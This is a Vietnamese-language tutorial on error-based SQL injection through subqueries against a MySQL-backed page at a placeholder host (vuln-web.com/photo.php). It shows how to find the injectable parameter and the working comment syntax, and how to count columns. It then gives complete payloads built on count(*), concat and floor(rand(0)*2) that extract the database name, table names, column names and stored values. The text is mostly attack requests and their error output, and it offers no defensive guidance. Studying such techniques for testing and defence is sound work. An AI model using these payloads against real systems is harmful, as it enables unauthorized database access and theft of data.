### Người thực hiện: Trần Ngọc Nam
### Thời gian: 23/04/2022

## Error Based Injection SubQuery Injection:
- Thông thường, lỗi tiêm sub query thường được sử dụng khi XPATH bị hạn chế bởi phiên bản SQL hoặc đã bị chặn bởi website.
- Đầu tiên, ta sẽ tiến hành kiểm tra xem trang web bằng một vài kí tự có thể tạo ra lỗi như <code>/</code>, <code>"</code>, <code>'</code>.
  ```php
  www.vuln-web.com/photo.php?id=1/
  No Error
  www.vuln-web.com/photo.php?id=1"
  No Error
  www.vuln-web.com/photo.php?id=1'
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
  ```
- Ta có thể nhận thấy trang web trả về lỗi <code>''1'' LIMIT 0,1'</code>.
- Điều đó có nghĩa là <code>'1'' LIMIT 0,1</code> là phần truy vấn. Đầu vào <code>1'</code> đã tạo ra lỗi.
- Từ đó, ta có thể giả định truy vấn tạo ra lỗi có dạng:
  ```php
  select field1,field2 from table1 where id='<our_input_here>' LIMIT 0,1;
  ```
- Tiếp theo, ta sẽ thử comment phần còn lại với <code>--</code>, <code>#</code>, <code>/*</code>, <code>-- -</code>.
  ```php
  www.vuln-web.com/photo.php?id=1'--
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 
  www.vuln-web.com/photo.php?id=1'#
  You have an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
  www.vuln-web.com/photo.php?id=1'/*
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/*' LIMIT 0,1' at line 1
  www.vuln-web.com/photo.php?id=1'-- -
  No Error
  ```
- Trong trường hợp này, ta nhận thấy comment hoạt động là <code>-- -</code>. Ta sẽ kết hợp toán tử <code>and</code> để tiến hành trích xuất dữ liệu từ trang web.
- Vì vậy, truy vấn có thể gây ra lỗi lúc này có dạng:
  ```php
  select field1,field2 from table1 where id='1' and true-- -' LIMIT 0,1;
  ```
- Tuy nhiên, những gì nằm phía sau <code>-- -</code> sẽ được tính là comment. Nên câu truy vấn chính thức sẽ có dạng:
  ```php
  select field1,field2 from table1 where id='1' and true;
  ```
- Câu truy vấn ở trên vì 2 vế đều đúng nên trang vẫn trả về kết quả bình thường. Lần này, ta sẽ tiêm sai:
  ```php
  select field1,field2 from table1 where id='1' and false;
  ```
- Lần này, web sẽ load không bình thường. Nó sẽ không thông qua bất kỳ lỗi nào nhưng bạn sẽ không nhận được web bình thường như trước đó. Điều này chứng tỏ lỗi tiêm đã hoạt động.
  ```php
  www.vuln-web.com/photo.php?id=1' and true-- -
  Normal Page
  www.vuln-web.com/photo.php?id=1' and false-- -
  Page din't Load As normally it do as the query dint returned anything.
  ```
- Bây giờ, ta sẽ tiến hành check số lượng cột:
  ```php
  www.vuln-web.com/photo.php?id=1' order by 1-- -
  No Error
  www.vuln-web.com/photo.php?id=1' order by 1,2-- -
  No Error
  www.vuln-web.com/photo.php?id=1' order by 1,2,3-- -
  No Error
  www.vuln-web.com/photo.php?id=1' order by 1,2,3,4-- -
  Error : Unknown column '4' in 'order clause'
  ```
- Ta có thể nhận số cột là 3. Tiếp theo, ta sẽ lấy dữ liệu với:
  ```php
  www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
  ```
- Để lấy được tên các table, ta dùng:
  ```php
  www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
  ```
- Muốn lấy thông tin các cột của table, ta dùng:
  ```php
  www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select column_name from information_schema.columns where table_schema=database() and table_name='<table_name_here>' limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
  ```
- Cuối cùng, ta có thể lấy dữ liễu từ các cột đã check được:
  ```php
  www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select concat(<column_1>,<column_2>) from <table_name_here> limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
  ```